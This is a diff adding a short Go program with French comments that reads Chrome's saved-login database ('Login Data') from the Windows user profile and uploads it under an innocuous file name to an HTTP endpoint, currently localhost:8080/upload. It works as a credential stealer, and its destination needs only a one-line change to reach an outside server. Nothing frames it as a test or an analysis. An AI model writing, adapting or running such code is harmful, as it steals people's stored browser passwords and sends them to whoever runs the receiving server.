@@ -1,0 +1,77 @@
+package main
+
+import (
+	"bytes"
+	"fmt"
+	"io"
+	"mime/multipart"
+	"net/http"
+	"os"
+)
+
+func main() {
+	// URL du serveur
+	url := "http://localhost:8080/upload"
+
+	// Ouvrir le fichier à envoyer
+	filePath := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+	file, err := os.Open(filePath)
+	if err != nil {
+		fmt.Println("Erreur lors de l'ouverture du fichier:", err)
+		return
+	}
+	defer file.Close()
+
+	// Créer un buffer pour stocker la requête multipart
+	var requestBody bytes.Buffer
+	writer := multipart.NewWriter(&requestBody)
+
+	// Ajouter le fichier sous le champ "file"
+	part, err := writer.CreateFormFile("file", "fichier.txt") // "file" doit correspondre au champ attendu par le serveur
+	if err != nil {
+		fmt.Println("Erreur lors de la création du champ fichier:", err)
+		return
+	}
+
+	// Copier le contenu du fichier dans le champ multipart
+	_, err = io.Copy(part, file)
+	if err != nil {
+		fmt.Println("Erreur lors de la copie du fichier:", err)
+		return
+	}
+
+	// Terminer l'écriture du multipart
+	err = writer.Close()
+	if err != nil {
+		fmt.Println("Erreur lors de la fermeture du writer:", err)
+		return
+	}
+
+	// Construire la requête HTTP
+	req, err := http.NewRequest("POST", url, &requestBody)
+	if err != nil {
+		fmt.Println("Erreur lors de la création de la requête:", err)
+		return
+	}
+
+	// Ajouter l'en-tête Content-Type correct
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	// Exécuter la requête
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Println("Erreur lors de l'envoi de la requête:", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	// Lire et afficher la réponse du serveur
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		fmt.Println("Erreur lors de la lecture de la réponse:", err)
+		return
+	}
+
+	fmt.Println("Réponse du serveur:", string(body))
+}
